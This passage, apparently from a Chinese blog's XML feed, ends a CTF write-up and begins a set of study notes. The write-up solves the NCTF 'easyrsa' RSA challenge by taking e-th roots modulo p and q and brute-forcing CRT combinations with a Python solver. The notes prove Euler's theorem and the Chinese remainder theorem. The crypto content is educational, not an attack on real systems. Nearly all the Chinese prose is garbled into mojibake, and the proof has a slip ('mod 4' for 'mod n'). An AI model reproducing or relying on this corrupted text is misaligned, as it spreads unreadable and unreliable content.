src="https://i.loli.net/2020/04/30/GpdjI3LEmOABuwb.png" alt="Algorithm 4 Our 5-th root algorithm"></p><h5 id="ä¾‹3-q-equiv-lr-3-1-pmod-r-4-0-lt-l-lt-r"><a href="#ä¾‹3-q-equiv-lr-3-1-pmod-r-4-0-lt-l-lt-r" class="headerlink" title="ä¾‹3 $q \equiv  lr^3 + 1 \pmod{ r^4} 0 &lt; l &lt; r:$"></a>ä¾‹3 $q \equiv  lr^3 + 1 \pmod{ r^4} 0 &lt; l &lt; r:$</h5><p>å½“$s=3$ï¼Œ$Î¶ = (c^Î±)^\frac{q-1}{r^3} = 1$ æœ‰$r^t$é˜¶$ï¼ˆt=0,1,2ï¼‰$ï¼ŒåŒæ—¶ $Î¾ $æ˜¯ä¸€ä¸ª$r^3 $é˜¶çš„åŸæ ¹ ï¼Œæ»¡è¶³ï¼š</p><p>$Î¾^{r^3-t} = Î¶^i $ and $(Î¾^{r^3-t})^j = Î¶$ with $ij \equiv 1 \pmod {r^t}$</p><p>æ‰€ä»¥ï¼Œ$c$çš„$r$æ¬¡æ ¹å¯ä»¥è¡¨ç¤ºä¸º$cbÎ¾^u$ï¼Œå½“$t=0ï¼Œu=0,x=cb$å³æ˜¯$c$çš„ä¸€ä¸ª$r$æ¬¡æ ¹ï¼Œå½“$t=1$ï¼Œ</p><p>$u \equiv  âˆ’jr \pmod{ r^2}$, å½“$t=2$ï¼Œ $u \equiv  âˆ’j \pmod{ r^2}$,</p><p>è®¡ç®—è¿‡ç¨‹ç±»æ¯”ä¸Šæ–‡ï¼Œåªæ˜¯è¦è€ƒè™‘çš„ï¼ˆ$u$ï¼‰çš„æƒ…å†µå¢åŠ åˆ°äº†r^2ç§ã€‚</p><h3 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h3><p>å›åˆ°å¼€å¤´è¯´çš„NCTF cryptoå…¨åœºä¸¤è§£ï¼ˆå¤§ä½¬éƒ½å»éš”å£æ‰“D3äº†~ï¼‰çš„å‹è½´â€”â€”easyrsa</p><p>é¢˜ç›®ï¼šï¼ˆæ•°å­—å¤ªå¤§ï¼Œå°±çœå»äº†ï¼‰</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from rsav import * </span><br><span class="line"> </span><br><span class="line">e = 0x1337 </span><br><span class="line">p =  </span><br><span class="line">q =  </span><br><span class="line">n = p * q </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">''' </span><br><span class="line">assert(flag.startswith('NCTF')) </span><br><span class="line">m = int.from_bytes(flag.encode(), 'big') </span><br><span class="line">assert(m.bit_length() &gt; 1337) </span><br><span class="line"> </span><br><span class="line">c = pow(m, e, n) </span><br><span class="line">print(c)''' </span><br><span class="line">c=</span><br></pre></td></tr></table></figure><p>è§£é¢˜æ€è·¯ï¼š</p><p>å¾ˆæ™®é€šçš„åŠ å¯†æ‰‹æ®µï¼Œç„¶å$p,q$éƒ½ç»™äº†ï¼Œå…¶ä¸­ï¼Œ$e|q-1ï¼›e|p-1$</p><p>å”¯ä¸€éš¾ç‚¹å°±åœ¨$e$æ˜¯$Ï†(n)$çš„ä¸€ä¸ªå› å­æ‰€ä»¥æ ¹æœ¬æ— æ³•æ±‚å‡ºç§é’¥$d$</p><p>ç¬¬ä¸€æ­¥æ˜¯ç±»ä¼¼rabinï¼Œå…ˆå°†$m^e \equiv  c \pmod{ n}$åˆ†è§£æˆåŒä½™å¼ç»„</p><p>$m^e \equiv  c \pmod{ p}$</p><p>$m^e \equiv  c \pmod{ q}$</p><p>æ±‚å‡º$m_1$å’Œ$m_2$ï¼Œå†ç”¨CRTå°±å¥½äº†</p><p>è‡³äºmçš„æ±‚è§£ï¼Œæœ¬é¢˜çš„æ¡ä»¶æ­£å¥½ç¬¦åˆä¸Šæ–‡çš„ä¾‹1ï¼Œ</p><p><img src="https://i.loli.net/2020/04/30/SLkGiW31DNThBdl.png" alt="context"></p><p>äºæ˜¯æˆ‘ä»¬å…ˆéå†å‡º$Î±$ï¼Œç„¶åå°±å¯ä»¥æ±‚å¾—$m_1$äº†ï¼Œ</p><p>å†ç®—å‡ºå¦ä¸€ä¸ª$Î±$ï¼Œå¾—åˆ°$m_2$ï¼Œç„¶åCRTèµ°ä¸€æ³¢ï¼Œå°±å¯ä»¥å‡ºæ˜æ–‡çš„ä¸€ç§æƒ…å†µäº†ï¼Œ</p><p>ç„¶è€Œä¸€å…±æœ‰$e^2$ç§æƒ…å†µ</p><p>å½“$e=2$ï¼Œrabinè§£å¯†ï¼Œæœ‰$e^2$ç§æƒ…å†µï¼Œå› ä¸ºåŒä½™æ–¹ç¨‹ç»„é‡Œçš„æ¯ä¸€ä¸ªæ–¹ç¨‹éƒ½æœ‰ä¸¤ç§æƒ…å†µã€‚</p><p>å½“$e=3$ï¼Œæ¯ä¸ªå°±æœ‰ä¸‰ç§ï¼ŒCRTåä¸€å…±å°±æœ‰$3^2$ç§</p><p>æ ¹æ®<a href="https://crypto.stackexchange.com/questions/63614/finding-the-n-th-root-of-unity-in-a-finite-field" target="_blank" rel="noopener">hint2</a>ï¼Œé‡Œé¢æœ‰æä¾›å½“æ‰¾åˆ°ä¸€ç§è§£åæ‰¾åˆ°å…¶ä½™è§£çš„ç®—æ³•</p><p><img src="https://i.loli.net/2020/04/30/VQF7UhL3DBORW4I.png" alt="sol"></p><p>åœ¨æœ‰é™åŸŸ$F_q$ä¸­ï¼Œä¹˜æ³•å­ç¾¤çš„é˜¶ä¸º$q-1$ï¼Œå¦‚æœ$n$ä¸æ»¡è¶³$n|q-1$ï¼Œé‚£ä¹ˆ$n$æ¬¡å•ä½æ ¹åªæœ‰1æœ¬èº«ï¼Œå¦‚æœ$n$æ»¡è¶³$n|q-1$ï¼Œé‚£ä¹ˆå°±æœ‰$n$ä¸ªå•ä½æ ¹ã€‚</p><p>ç”±è´¹é©¬å°å®šç†$(x^\frac{q-1}{n})^n = x^{q-1} = 1$        æ‰€ä»¥æˆ‘ä»¬æœ‰næ¬¡å•ä½æ ¹$x^\frac{q-1}{n}$</p><p>å½“æˆ‘ä»¬è¿™ä¸ªnæ¬¡å•ä½æ ¹ä¸ç­‰äº1æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨å®ƒå’Œæˆ‘ä»¬æ‰¾åˆ°çš„ä¸€ä¸ªæ ¹æ¥ç”Ÿæˆä¸€ä¸ªé˜¶ä¸º$n$çš„å¾ªç¯ç¾¤ï¼Œè¿™ä¸ªç¾¤é‡Œæ‰€æœ‰çš„å…ƒç´ å³ä¸ºæˆ‘ä»¬æƒ³è¦çš„æ‰€æœ‰çš„æ ¹ã€‚</p><p>è¿™æ ·æˆ‘ä»¬æ„é€ expï¼Œéå†è¿™0x1337*0x1337=24196561ç§å¯èƒ½ï¼Œå°±èƒ½è§£å‡ºçœŸæ­£çš„å¯†æ–‡äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n2s</span><span class="params">(x)</span>:</span> </span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        <span class="keyword">try</span>: </span><br><span class="line">            flag = hex(x)[<span class="number">2</span>:].decode(<span class="string">"hex"</span>) </span><br><span class="line">        <span class="keyword">except</span>: </span><br><span class="line">            flag = hex(x)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">"hex"</span>) </span><br><span class="line">    <span class="keyword">except</span>: </span><br><span class="line">        flag=<span class="string">''</span> </span><br><span class="line">    <span class="keyword">return</span> flag </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">onemod</span><span class="params">(p,r)</span>:</span> </span><br><span class="line">    t=p<span class="number">-2</span> </span><br><span class="line">    <span class="keyword">while</span> pow(t,(p<span class="number">-1</span>)/r,p)==<span class="number">1</span>: t-=<span class="number">1</span> </span><br><span class="line">    <span class="keyword">return</span> pow(t,(p<span class="number">-1</span>)/r,p) </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span><span class="params">(p,root)</span>:</span>  </span><br><span class="line">    g=onemod(p,<span class="number">0x1337</span>) </span><br><span class="line">    may=[] </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x1337</span>): </span><br><span class="line">        may.append(root*pow(g,i,p)%p) </span><br><span class="line">    <span class="keyword">return</span> may </span><br><span class="line"> </span><br><span class="line">c =  </span><br><span class="line"> </span><br><span class="line">p =  </span><br><span class="line"> </span><br><span class="line">q =  </span><br><span class="line">e = <span class="number">0x1337</span> </span><br><span class="line">n = p*q </span><br><span class="line"> </span><br><span class="line">c_p = pow(c,(<span class="number">1</span>+<span class="number">3307</span>*(p<span class="number">-1</span>)/e)/e,p)  <span class="comment">#på¯¹åº”çš„Î±=3307 </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"find one"</span> </span><br><span class="line">C1=solution(p,c_p)[::<span class="number">-1</span>]   <span class="comment">#é€†åºï¼Œé—®é¢˜ä¸å¤§ï¼Œåªæ˜¯è·‘è¿‡ä¸€æ¬¡ï¼Œå‘ç°ç­”æ¡ˆåœ¨ä¸¤åƒå¤šä¸‡æ¬¡å </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"find all"</span> </span><br><span class="line">c_q = pow(c,(<span class="number">1</span>+(<span class="number">2649</span>*(q<span class="number">-1</span>)/e))/e,q) <span class="comment">#qå¯¹åº”çš„Î±=2649 </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"find another"</span> </span><br><span class="line">C2=solution(q,c_q)[::<span class="number">-1</span>] </span><br><span class="line"><span class="keyword">print</span> <span class="string">"find all"</span> </span><br><span class="line">a= gmpy2.invert(p,q) </span><br><span class="line">b = gmpy2.invert(q,p) </span><br><span class="line"><span class="comment">#x = (b*q*c_p+a*p*c_q)%n </span></span><br><span class="line">flag=<span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> C1: </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> C2: </span><br><span class="line">        flag+=<span class="number">1</span> </span><br><span class="line">        <span class="keyword">if</span> flag%<span class="number">1000000</span> == <span class="number">0</span>: </span><br><span class="line">            <span class="keyword">print</span> flag </span><br><span class="line">        x = (b*q*i+a*p*j)%n </span><br><span class="line">        <span class="keyword">if</span> <span class="string">"NCTF"</span> <span class="keyword">in</span> n2s(x): </span><br><span class="line">            <span class="keyword">print</span> n2s(x) </span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/LjK7yHEBhNqga9O.png" alt="flag"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸€æ¬¡å€ŸNCTFäº†è§£äº†åœ¨åŸŸä¸­å¼€æ ¹çš„ä¸€ç§é«˜æ•ˆæ–¹æ³•ï¼Œ</p><p>å¹¶ä¸”æœ‰å¹¸æ‹¿åˆ°äº†ä¸€ä¸ªä¸€è¡€ï¼Œä¸å¾—ä¸è¯´ï¼Œè¿™å…¬å¼ï¼ŒçœŸé¦™~</p><p>å¦å¤–æ„Ÿè°¢è¿™æ¬¡NCTFï¼Œåœ¨è¿™æ¬¡å¯†ç å­¦çš„èµ›é¢˜ä¸­å­¦åˆ°äº†å¾ˆå¤šï¼Œå¦å¤–ä¸€é“childrsaä¹Ÿå¾ˆæœ‰æ„æ€ï¼ˆæœ‰æ„æ€åœ¨æˆ‘æ„å¤–çš„å‘ç°äº†å…¶ä¸­ä¸€ä¸ªç¥å¥‡è§„å¾‹23333ï¼‰</p><p>æœ€åå†æ¬¡æ„Ÿè°¢soreatuå¸ˆå‚…åˆ¶ä½œçš„ä¼˜è´¨èµ›é¢˜ä»¥åŠèµ›åè¯¦ç»†çš„wpä¸æŒ‡ç‚¹~</p><p><del>ä½†æ˜¯è¿™ä¸ªæ–¹æ³•çš„é™åˆ¶æœ‰ç‚¹å¤šï¼Œsoreatuå¸ˆå‚…ç»™å‡ºçš„æ–¹æ³•åº”è¯¥æ¯”è¾ƒå…·æœ‰æ™®é€‚æ€§ï¼Œè†œ</del></p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> Rsa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rsa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ æ•°è®ºå››å¤§å®šç†åŠåº”ç”¨</title>
      <link href="/2019/12/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E8%AE%BA%E5%9B%9B%E5%A4%A7%E5%AE%9A%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2019/12/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E8%AE%BA%E5%9B%9B%E5%A4%A7%E5%AE%9A%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>é¦–å‘äº<a href="https://www.anquanke.com/post/id/194137" target="_blank" rel="noopener">å®‰å…¨å®¢</a></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¯ä»¥å‘ç°RSAä¸­çš„å¾ˆå¤šæ”»å‡»æ–¹æ³•éƒ½æ˜¯ä»æ•°è®ºå››å¤§å®šç†æ¨å¯¼å‡ºçš„ï¼Œæ‰€ä»¥æ‰¾æ—¶é—´å¥½å¥½å­¦ä¹ äº†ä¸€ä¸‹æ•°è®ºå››å¤§å®šç†çš„è¯æ˜åŠå…¶åº”ç”¨åœºæ™¯â€”â€”Rabinç®—æ³•ã€‚</p><h2 id="æ¬§æ‹‰å®šç†"><a href="#æ¬§æ‹‰å®šç†" class="headerlink" title="æ¬§æ‹‰å®šç†"></a>æ¬§æ‹‰å®šç†</h2><p>è‹¥$n,a$ä¸ºæ­£æ•´æ•°ï¼Œä¸”$n,a$äº’ç´ ï¼Œå³$gcd(a,n) = 1$ï¼Œåˆ™</p><p>$a^{Ï†(n)}\equiv1\pmod{n}$</p><h3 id="è¯æ˜"><a href="#è¯æ˜" class="headerlink" title="è¯æ˜"></a>è¯æ˜</h3><p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“æ¬§æ‹‰å®šç†æ˜¯ä»€ä¹ˆï¼š</p><p> æ•°è®ºä¸Šçš„æ¬§æ‹‰å®šç†ï¼ŒæŒ‡çš„æ˜¯</p><p>$a^{Ï†(n)}\equiv1\pmod{n}$</p><p>è¿™ä¸ªå¼å­å®åœ¨$a$å’Œ$n$äº’è´¨çš„å‰æä¸‹æˆç«‹çš„ã€‚</p><p>è¯æ˜</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬çŸ¥é“åœ¨1åˆ°$n$çš„æ•°ä¸­ï¼Œä¸näº’è´¨çš„ä¸€å…±æœ‰$Ï†(n$)ä¸ªï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠè¿™$Ï†(n)$ä¸ªæ•°æ‹¿å‡ºæ¥ï¼Œæ”¾åˆ°è®¾å‡ºçš„é›†åˆXä¸­ï¼Œå³ä¸º$x_1,x_2â€¦â€¦x_{Ï†(n)}$</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥å†è®¾å‡ºä¸€ä¸ªé›†åˆä¸ºMï¼Œè®¾Mä¸­çš„æ•°ä¸ºï¼š</p><p>$m_1=aâˆ—x_1,m_2=aâˆ—x_2â€¦â€¦m_Ï†(n)=aâˆ—x_{Ï†(n)}$</p><p>ä¸‹é¢æˆ‘ä»¬è¯æ˜ä¸¤ä¸ªæ¨ç†ï¼š</p><h4 id="ä¸€ã€Mä¸­ä»»æ„ä¸¤ä¸ªæ•°éƒ½ä¸æ¨¡nåŒä½™ã€‚"><a href="#ä¸€ã€Mä¸­ä»»æ„ä¸¤ä¸ªæ•°éƒ½ä¸æ¨¡nåŒä½™ã€‚" class="headerlink" title="ä¸€ã€Mä¸­ä»»æ„ä¸¤ä¸ªæ•°éƒ½ä¸æ¨¡nåŒä½™ã€‚"></a>ä¸€ã€Mä¸­ä»»æ„ä¸¤ä¸ªæ•°éƒ½ä¸æ¨¡nåŒä½™ã€‚</h4><p>åè¯æ³•ã€‚</p><p>è¯æ˜ï¼šå‡è®¾Mä¸­å­˜åœ¨ä¸¤ä¸ªæ•°è®¾ä¸º$m_a,m_b$æ¨¡$n$åŒä½™ã€‚</p><p> å³$m_a\equiv m_b$</p><p> ç§»é¡¹å¾—åˆ°ï¼š$m_aâˆ’m_b=nâˆ—k$</p><p> å†å°†mç”¨xæ¥è¡¨ç¤ºå¾—åˆ°ï¼š$aâˆ—x_aâˆ’aâˆ—x_b=nâˆ—k$</p><p> æå–å…¬å› å¼å¾—åˆ°ï¼š$aâˆ—(x_aâˆ’x_b)=nâˆ—k$</p><p> æˆ‘ä»¬ç°åœ¨å·²çŸ¥$a$ä¸$n$äº’è´¨ï¼Œé‚£ä¹ˆå¼å­å°±å¯ä»¥è½¬åŒ–ä¸ºï¼š</p><p>$x_aâˆ’x_b\equiv 0 \pmod{n}$</p><p>å› ä¸º$a$ä¸­æ²¡æœ‰ä¸$n$çš„å…¬å› å­ï¼ˆ1é™¤å¤–ï¼‰æ‰€ä»¥$a !\equiv  0 \pmod{n}$ æ‰€æœ‰åªèƒ½æ˜¯$ x_aâˆ’x_b\equiv 0\pmod{n}$ã€‚</p><p> åˆå› ä¸º$x_a,x_b$éƒ½æ˜¯å°äº$n$çš„å¹¶ä¸”ä¸ä¼šç›¸åŒï¼Œé‚£ä¹ˆä¸Šè¿°çš„å¼å­è‡ªç„¶å…¨éƒ½ä¸æˆç«‹ã€‚</p><p> å‡è®¾ä¸æˆç«‹ã€‚</p><p>è¯å¾—ï¼š$M$ä¸­ä»»æ„ä¸¤ä¸ªæ•°éƒ½ä¸æ¨¡$4$åŒä½™ã€‚</p><h4 id="äºŒã€Mä¸­çš„æ•°é™¤ä»¥nçš„ä½™æ•°å…¨éƒ¨ä¸näº’è´¨ã€‚"><a href="#äºŒã€Mä¸­çš„æ•°é™¤ä»¥nçš„ä½™æ•°å…¨éƒ¨ä¸näº’è´¨ã€‚" class="headerlink" title="äºŒã€Mä¸­çš„æ•°é™¤ä»¥nçš„ä½™æ•°å…¨éƒ¨ä¸näº’è´¨ã€‚"></a>äºŒã€Mä¸­çš„æ•°é™¤ä»¥nçš„ä½™æ•°å…¨éƒ¨ä¸näº’è´¨ã€‚</h4><p>è¯æ˜ï¼šæˆ‘ä»¬å·²çŸ¥$m_i=aâˆ—x_i$</p><p> åˆå› ä¸º$a$ä¸$n$äº’è´¨ï¼Œ$x_i$ä¸$n$äº’è´¨ï¼Œæ‰€ä»¥å¯å¾—$m_i$ä¸$n$äº’è´¨ã€‚</p><p> å¸¦å…¥åˆ°æ¬§å‡ é‡Œå¾—ç®—æ³•ä¸­æ¨ä¸€æ­¥å°±å¥½äº†ã€‚</p><p> å³ï¼š</p><p>$gcd(aâˆ—xi,n)=gcd(mi,n)=gcd(n,mi mod n)=1$</p><p>è¯æ¯•ã€‚</p><h4 id="ä¸‰ã€æ ¹æ®æˆ‘ä»¬è¯å¾—çš„ä¸¤ä¸ªæ€§è´¨ï¼Œå°±å¯ä»¥å¼€å§‹æ¨å¼å­äº†ã€‚"><a href="#ä¸‰ã€æ ¹æ®æˆ‘ä»¬è¯å¾—çš„ä¸¤ä¸ªæ€§è´¨ï¼Œå°±å¯ä»¥å¼€å§‹æ¨å¼å­äº†ã€‚" class="headerlink" title="ä¸‰ã€æ ¹æ®æˆ‘ä»¬è¯å¾—çš„ä¸¤ä¸ªæ€§è´¨ï¼Œå°±å¯ä»¥å¼€å§‹æ¨å¼å­äº†ã€‚"></a>ä¸‰ã€æ ¹æ®æˆ‘ä»¬è¯å¾—çš„ä¸¤ä¸ªæ€§è´¨ï¼Œå°±å¯ä»¥å¼€å§‹æ¨å¼å­äº†ã€‚</h4><p>é¦–å…ˆï¼Œæ ¹æ®å‰ä¸¤ä¸ªæ¨è®ºå¯ä»¥çŸ¥é“ï¼Œ$M$ä¸­çš„æ•°åˆ†åˆ«å¯¹åº”$X$ä¸­çš„æ¯ä¸ªæ•°æ¨¡$n$åŒä½™ã€‚</p><p>ï¼ˆå³æ˜¯åŒå°„å…³ç³»ï¼šé¦–å…ˆMä¸­çš„æ•°åœ¨æ¨¡nä¸‹ä¸åŒä½™ï¼Œå³ä¸ç›¸åŒï¼Œç„¶åæœ‰$Ï†(n)$ä¸ª$m$ï¼›å…¶æ¬¡æœ‰$Ï†(n)$ä¸ªä¸ç›¸åŒçš„$x$ä¸$n$äº’è´¨ï¼Œæ‰€ä»¥$m$ä¸$x$æ˜¯åŒå°„å…³ç³»ï¼‰</p><p>æ‰€ä»¥å¯ä»¥å¾—åˆ°ï¼š</p><p>$m_1âˆ—m_2âˆ—â€¦â€¦âˆ—m_{Ï†(n)}\equiv x_1âˆ—x_2âˆ—â€¦â€¦âˆ—x_{Ï†(n)}\pmod{n}$</p><p>ç°åœ¨æˆ‘ä»¬æŠŠæ›¿æ¢æˆxçš„å½¢å¼ï¼Œå°±å¯ä»¥å¾—åˆ°ï¼š</p><p>$aâˆ—x_1âˆ—aâˆ—x_2âˆ—â€¦â€¦âˆ—aâˆ—x_{Ï†(n)}\equiv x_1âˆ—x_2âˆ—â€¦â€¦âˆ—x_{Ï†(n)}\pmod{n}$</p><p>$a^{Ï†(n)}âˆ—(x_1âˆ—x_2â€¦â€¦âˆ—x_{Ï†(n)})\equiv x_1âˆ—x_2â€¦â€¦âˆ—x_{Ï†(n)}\pmod{n}$</p><p>$(a^Ï†(n)âˆ’1)âˆ—(x_1âˆ—x_2â€¦â€¦âˆ—x_{Ï†(n)})\equiv 0\pmod{n}$</p><p>ç„¶åï¼Œç”±äº$(x_1âˆ—x_2â€¦â€¦âˆ—x_{Ï†(n)}) !\equiv 0\pmod{n}$</p><p>æ‰€ä»¥    $(a^{Ï†(n)}âˆ’1)\equiv 0\pmod{n}$</p><p>æ‰€ä»¥    $a^{Ï†(n)}\equiv 1\pmod{n}$</p><h3 id="åº”ç”¨ï¼šRSAçš„è§£å¯†"><a href="#åº”ç”¨ï¼šRSAçš„è§£å¯†" class="headerlink" title="åº”ç”¨ï¼šRSAçš„è§£å¯†"></a>åº”ç”¨ï¼šRSAçš„è§£å¯†</h3><p>æ¬§æ‹‰å®šç†åœ¨RSAä¸­å¯ç”¨äºè¯æ˜ $M\equiv C^d \pmod{N}$ ï¼š</p><p><img src="https://i.loli.net/2020/04/30/zmodaOUq2NSv6IP.png" alt="RSAè§£å¯†éªŒè¯"> </p><h2 id="è´¹é©¬å°å®šç†ï¼ˆæ¬§æ‹‰å®šç†ç‰¹æ®Šå‹æƒ…å†µï¼‰"><a href="#è´¹é©¬å°å®šç†ï¼ˆæ¬§æ‹‰å®šç†ç‰¹æ®Šå‹æƒ…å†µï¼‰" class="headerlink" title="è´¹é©¬å°å®šç†ï¼ˆæ¬§æ‹‰å®šç†ç‰¹æ®Šå‹æƒ…å†µï¼‰"></a>è´¹é©¬å°å®šç†ï¼ˆæ¬§æ‹‰å®šç†ç‰¹æ®Šå‹æƒ…å†µï¼‰</h2><p> å¯¹äºè´¨æ•°pï¼Œä»»æ„æ•´æ•°aï¼Œå‡æ»¡è¶³ï¼š$a^{p-1}\equiv 1 \pmod{p}$</p><p>é‚£ä¹ˆï¼Œ$a^{p-2}$å°±æ˜¯aåœ¨æ¨¡pä¸‹çš„é€†å…ƒäº†</p><h2 id="å­™å­å®šç†ï¼ˆä¸­å›½å‰©ä½™å®šç†-CRTï¼‰"><a href="#å­™å­å®šç†ï¼ˆä¸­å›½å‰©ä½™å®šç†-CRTï¼‰" class="headerlink" title="å­™å­å®šç†ï¼ˆä¸­å›½å‰©ä½™å®šç† CRTï¼‰"></a>å­™å­å®šç†ï¼ˆä¸­å›½å‰©ä½™å®šç† CRTï¼‰</h2><p>è®¾æ­£æ•´æ•°$m_1,m_2â€¦m_k$ä¸¤ä¸¤äº’ç´ ï¼Œåˆ™åŒä½™æ–¹ç¨‹ç»„<br>$x \equiv a_1 \pmod{m_1}$<br>$x \equiv a_2 \pmod{m_2}$<br>$x \equiv a_3 \pmod{m_3}$<br>â€¦<br>$x \equiv a_k \pmod{m_k}$</p><p>æœ‰æ•´æ•°è§£ã€‚å¹¶ä¸”åœ¨æ¨¡$M = m_1 \cdot m_2 \cdot â€¦ \cdot m_k$ä¸‹çš„è§£æ˜¯å”¯ä¸€çš„ï¼Œè§£ä¸º<br>$x \equiv (a_1M_1M_1^{-1} + a_2M_2M_2^{-1} + â€¦ + a_kM_kM_k^{-1}) \mod M$</p><p>å…¶ä¸­$M_i = M / m_i$ï¼Œè€Œ$M_i^{-1}$ä¸º$M_i$æ¨¡$m_i$çš„é€†å…ƒã€‚</p><h3 id="è¯æ˜-1"><a href="#è¯æ˜-1" class="headerlink" title="è¯æ˜"></a>è¯æ˜</h3><p>å…·ä½“è¯æ˜å¦‚ä¸‹ï¼š</p><p>ä¾‹ï¼šæ‰¾å‡ºæ‰€æœ‰æ•´æ•°x,ä½¿å…¶è¢«3ï¼Œ5å’Œ7é™¤æ—¶ï¼Œä½™æ•°åˆ†åˆ«ä¸º2ï¼Œ3å’Œ2</p><p>$x\equiv 2 \pmod{3}$</p><p>$x\equiv 3 \pmod{5}$</p><p>$x\equiv 2 \pmod{7}$</p><p>=&gt;      $x = â–³ + 3<em>5</em>7*t$  (â–³ä¸ºæœŸä¸­çš„ä¸€ä¸ªè§£ï¼Œtä¸ºæ•´æ•°ï¼‰</p><p>åœ¨åŒä½™ä¸­æœ€é‡è¦çš„è§‚å¿µå°±æ˜¯æ±‚å‡ºç¬¬ä¸€ä¸ªè§£ï¼Œé‚£ä¹ˆ$x = â–³ + 3<em>5</em>7*t$å°±æ˜¯é€šè§£ã€‚é‚£æ€ä¹ˆæ±‚ä¸€ä¸ªè§£å‘¢ï¼Ÿ</p><p>åˆ©ç”¨åŒä½™çš„åŠ æ€§ï¼š</p><p>æŠŠ$x$æ‹†æˆ$a+b+c$,å³$x = a + b + c            $</p><p>ä»¤</p><p>$a\equiv 2 \pmod{3}$</p><p>$a\equiv 0 \pmod{5}$</p><p>$a\equiv 0 \pmod{7}$</p><p>=&gt; $a=35p$ ( å¯ä»¥çœ‹åˆ°på–1çš„æ—¶å€™æ»¡è¶³$a\equiv 2\pmod{3}$,å³$a=35 $)</p><p><strong>ä¸ºä½•è¿™æ ·å–ï¼Ÿä»æ¥ä¸‹æ¥çš„å–æ³•å¯çŸ¥ï¼šb å’Œ c éƒ½ä¼šå– 3 çš„å€æ•°ï¼Œè¿™æ ·å­å°±èƒ½ä¿è¯ï¼Œx  mod 3 = 2ï¼Œæˆ‘ä»¬æ ‡è®°è¿™æ ·çš„å–æ³•ä¸ºFLAG</strong> </p><p>æ¥ä¸‹æ¥è¦æ±‚bï¼š</p><p>$b\equiv 0\pmod{3}$</p><p>$b\equiv 3\pmod{5}$</p><p>$b\equiv 0\pmod{7}$</p><p>=&gt;$b=21q$ (å¯ä»¥çœ‹åˆ°qå–3çš„æ—¶å€™æ»¡è¶³$b\equiv 3\pmod{5}$,å³$b=63$)</p><p>æ±‚c</p><p>$c\equiv 0\pmod{3}$</p><p>$c\equiv 0\pmod{5}$</p><p>$c\equiv 2\pmod{7}$</p><p>$=&gt;$$c=15m$(å¯ä»¥çœ‹åˆ°må–2çš„æ—¶å€™æ»¡è¶³$c\equiv 2\pmod{7}$,å³$c=30$)</p><p>å¾—</p><p>$x\equiv 2\pmod{3}  \equiv  a + b + c$</p><p>$x\equiv 3\pmod{5}  \equiv  a 